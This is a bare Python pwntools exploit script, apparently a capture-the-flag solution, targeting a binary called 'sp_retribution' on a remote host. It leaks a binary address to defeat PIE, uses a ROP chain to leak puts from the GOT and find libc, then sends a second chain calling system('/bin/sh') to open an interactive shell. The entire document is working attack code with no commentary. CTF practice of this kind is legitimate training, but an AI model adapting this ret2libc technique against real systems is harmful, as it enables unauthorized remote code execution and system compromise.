from pwn import *

context.binary="./sp_retribution"
context.encoding="latin-1"

elf=context.binary
rop=ROP(elf)
libc=ELF("./glibc/libc.so.6")
rop_libc=ROP(libc)

#r=process()
r=remote('167.71.137.43',30189)

r.recvuntil(b">> ")
r.sendline(b"2")

r.recvuntil(b"y = ")
r.send(b"aaaaaaaa")
r.recvuntil(b"aaaaaaaa")
leak = r.recvline().strip()+b'\0\0'
leak = u64(leak)

BIN_BASE = leak - 0xd70
log.info(f'Binary Base -> {BIN_BASE:08x}')

PUTS_GOT = BIN_BASE + elf.got["puts"]
PUTS_PLT = BIN_BASE + elf.plt["puts"]
MAIN_PLT = BIN_BASE + elf.symbols["missile_launcher"]

pop_rdi = BIN_BASE + rop.find_gadget(["pop rdi","ret"]).address
ret     = BIN_BASE + rop.find_gadget(["ret"]).address

payload = b""
payload += b"A"*0x58
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MAIN_PLT)

log.info(f'payload len -> {hex(len(payload))} < 0x84')
r.recvuntil(b'(y/n): ')
r.sendline(payload)
r.recvuntil(b'reset!\x1b[1;34m\n')

leak = leak = r.recvline().strip()+b'\0\0'
leak = u64(leak)
LIBC_BASE = leak - libc.symbols["puts"]

log.info(f"libc base -> {LIBC_BASE:08x}")

SYSTEM = LIBC_BASE + libc.symbols["system"]
EXIT = LIBC_BASE + libc.symbols["exit"]
BINSH = LIBC_BASE + next(libc.search(b"/bin/sh"))

r.recvuntil(b"y = ")
r.send(b"aaaaaaaa")
r.recvuntil(b'(y/n): ')

payload2 = b""
payload2 += b"A"*0x58
#payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(BINSH)
payload2 += p64(SYSTEM)
payload2 += p64(EXIT)

r.sendline(payload2)
r.interactive()

